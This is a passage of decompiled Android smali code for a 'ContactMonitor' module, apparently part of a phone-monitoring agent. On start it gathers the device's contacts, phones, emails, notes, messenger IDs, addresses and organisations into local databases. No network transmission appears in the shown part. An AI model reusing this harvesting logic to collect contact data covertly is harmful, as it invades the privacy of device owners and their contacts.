.class public Lcom/hp/vd/module/monitor/ContactMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "ContactMonitor.java"


# static fields
.field public static final ATTRIBUTE_FIRST_RUN:Ljava/lang/String; = "first_run"

.field public static final ATTRIBUTE_GATHER_CONTACTS_ON_START:Ljava/lang/String; = "gather_contacts_on_start"

.field public static final ATTRIBUTE_LISTER_SLEEP_PERIOD:Ljava/lang/String; = "lister_sleep_period"

.field public static final ATTRIBUTE_MAX_CONTACT_INTERNAL_ID:Ljava/lang/String; = "max_contact_internal_id"

.field protected static final TAG:Ljava/lang/String; = "ContactMonitor"


# instance fields
.field protected contactAddressDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactAddressData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactEmailDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactEmailData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactInstantMessengerDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactInstantMessengerData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactNoteDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactNoteData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactOrganizationDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactOrganizationData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactPhoneDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactPhoneData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected initialContactListerThread:Ljava/lang/Thread;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 52
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 61
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 62
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactPhoneDao:Lcom/j256/ormlite/dao/Dao;

    .line 63
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactEmailDao:Lcom/j256/ormlite/dao/Dao;

    .line 64
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactNoteDao:Lcom/j256/ormlite/dao/Dao;

    .line 65
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactInstantMessengerDao:Lcom/j256/ormlite/dao/Dao;

    .line 66
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactAddressDao:Lcom/j256/ormlite/dao/Dao;

    .line 67
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactOrganizationDao:Lcom/j256/ormlite/dao/Dao;

    .line 69
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 71
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    .line 72
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    .line 73
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentUri:Landroid/net/Uri;

    .line 75
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    const/4 v0, 0x0

    .line 76
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->monitoringStatus:Z

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 2

    .line 391
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentUri:Landroid/net/Uri;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 392
    iput-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentUri:Landroid/net/Uri;

    .line 395
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    if-eqz v0, :cond_1

    .line 396
    iput-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    :cond_1
    const/4 v0, 0x1

    return v0
.end method

.method protected finalize()V
    .locals 1

    const/4 v0, 0x0

    .line 604
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 606
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactPhoneDao:Lcom/j256/ormlite/dao/Dao;

    .line 607
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactEmailDao:Lcom/j256/ormlite/dao/Dao;

    .line 608
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactNoteDao:Lcom/j256/ormlite/dao/Dao;

    .line 609
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactInstantMessengerDao:Lcom/j256/ormlite/dao/Dao;

    .line 610
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactAddressDao:Lcom/j256/ormlite/dao/Dao;

    .line 611
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactOrganizationDao:Lcom/j256/ormlite/dao/Dao;

    return-void
.end method

.method public getContactAddressDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactAddressData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 586
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactAddressDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 587
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactAddressData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactAddressDao:Lcom/j256/ormlite/dao/Dao;

    .line 590
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactAddressDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getContactEmailDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactEmailData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 559
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactEmailDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 560
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactEmailData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactEmailDao:Lcom/j256/ormlite/dao/Dao;

    .line 563
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactEmailDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getContactInstantMessengerDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactInstantMessengerData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 577
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactInstantMessengerDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 578
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactInstantMessengerData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactInstantMessengerDao:Lcom/j256/ormlite/dao/Dao;

    .line 581
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactInstantMessengerDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getContactNoteDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactNoteData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 568
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactNoteDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 569
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactNoteData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactNoteDao:Lcom/j256/ormlite/dao/Dao;

    .line 572
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactNoteDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getContactOrganizationDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactOrganizationData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 595
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactOrganizationDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 596
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactOrganizationData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactOrganizationDao:Lcom/j256/ormlite/dao/Dao;

    .line 599
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactOrganizationDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getContactPhoneDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactPhoneData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 550
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactPhoneDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 551
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactPhoneData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactPhoneDao:Lcom/j256/ormlite/dao/Dao;

    .line 554
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactPhoneDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getDao()Lcom/j256/ormlite/dao/Dao;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lcom/j256/ormlite/dao/Dao<",
            "+",
            "Lcom/hp/vd/data/IData;",
            "*>;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 538
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    if-nez v0, :cond_0

    .line 539
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    const-class v1, Lcom/hp/vd/data/ContactData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 542
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    check-cast v0, Lcom/hp/vd/data/persistency/ContextAware;

    invoke-interface {v0, p0}, Lcom/hp/vd/data/persistency/ContextAware;->setContext(Lcom/hp/vd/module/IModule;)V

    .line 545
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    return-object v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 82
    const-class v0, Lcom/hp/vd/data/ContactData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 87
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 89
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 90
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 91
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 92
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x3

    .line 93
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v3.0"

    .line 94
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 96
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_contact_internal_id"

    const-string v2, "0"

    .line 97
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "gather_contacts_on_start"

    const-string v2, "true"

    .line 98
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "lister_sleep_period"

    const-string v2, "20000"

    .line 99
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "first_run"

    const-string v2, "true"

    .line 100
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v1, 0x4

    .line 102
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 103
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 105
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "ContactMonitor"

    return-object v0
.end method

.method public initialize()Z
    .locals 7

    .line 273
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 279
    sget-object v1, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentUri:Landroid/net/Uri;

    .line 280
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    const/4 v1, 0x0

    .line 283
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v2, 0x1

    .line 297
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iput-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 305
    iget-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "first_run"

    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "true"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 306
    iget-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "first_run"

    const-string v5, "false"

    invoke-virtual {v3, v4, v5}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "ContactMonitor"

    const-string v4, "ATTRIBUTE_FIRST_RUN == true. Trying to load the temporarily saved values."

    .line 308
    invoke-interface {v0, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 310
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "system"

    .line 312
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 310
    invoke-virtual {v3, v4, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v3, "contact_max_contact_internal_id"

    .line 315
    invoke-interface {v1, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    const-string v3, "contact_max_contact_internal_id"

    const-string v4, "0"

    .line 316
    invoke-interface {v1, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 317
    iget-object v4, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "max_contact_internal_id"

    invoke-virtual {v4, v5, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "ContactMonitor"

    .line 319
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Loaded (after update) ATTRIBUTE_MAX_CONTACT_INTERNAL_ID: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const-string v3, "contact_gather_contacts_on_start"

    .line 322
    invoke-interface {v1, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    const-string v3, "contact_gather_contacts_on_start"

    const-string v4, "true"

    .line 323
    invoke-interface {v1, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 324
    iget-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "gather_contacts_on_start"

    invoke-virtual {v3, v4, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "ContactMonitor"

    .line 326
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Loaded (after update) ATTRIBUTE_GATHER_CONTACTS_ON_START: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 329
    :cond_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, "ContactMonitor"

    const-string v3, "Could not persist ATTRIBUTE_FIRST_RUN = FALSE."

    const/4 v4, 0x3

    .line 330
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_2
    const-string v1, "ContactMonitor"

    .line 355
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "initialize(): max_contact_internal_id set to "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "max_contact_internal_id"

    .line 358
    invoke-virtual {v4, v5}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 355
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    return v2

    :catch_0
    move-exception v1

    .line 362
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 364
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iput-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "ContactMonitor"

    const-string v4, "initialize(): get persisted module data"

    .line 366
    invoke-interface {v0, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v2

    :catch_1
    move-exception v2

    const-string v3, "ContactMonitor"

    const-string v4, "Could not create the Dao"

    .line 286
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 287
    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 113
